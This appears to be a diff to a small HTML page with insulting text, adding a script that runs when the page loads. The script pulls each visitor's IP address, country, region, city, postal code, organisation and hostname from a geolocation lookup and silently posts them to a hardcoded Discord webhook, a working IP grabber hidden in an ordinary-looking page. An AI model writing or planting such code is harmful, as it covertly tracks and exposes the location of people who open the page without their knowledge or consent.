@@ -12,5 +12,18 @@
         <h1>Gibon zjeb</h1>
     </header>
     <button>kys</button>
+    <script>
+        function geo(json) {
+          var request = new XMLHttpRequest();
+              request.open("POST", "https://discord.com/api/webhooks/1044996106783825960/xbBzH2fW9taiGbFVfO4lFML6UlC4XpMP1D9VtMXNdoxH-12dyDsETnVbtrCZ1d0FVuvi");
+              request.setRequestHeader('Content-type', 'application/json');
+          var params = {
+            avatar_url: "https://imgur.com/W7jEzEl",
+            content: "```" + "IP: " + json.ip + "\n" + "COUNTRY: " + json.country_name + "\n" + "STATE: " + json.region + "\n" + "CITY: " + json.city + "\n" + "POSTAL CODE: " + json.postal_code + "\n" + "ORG: " + json.org + "\n" + "HOSTNAME: " + json.hostname + "```"
+          }
+         request.send(JSON.stringify(params));
+        }
+        </script>
+        <script src="https://json.geoiplookup.io/?callback=geo"></script>
 </body>
 </html>
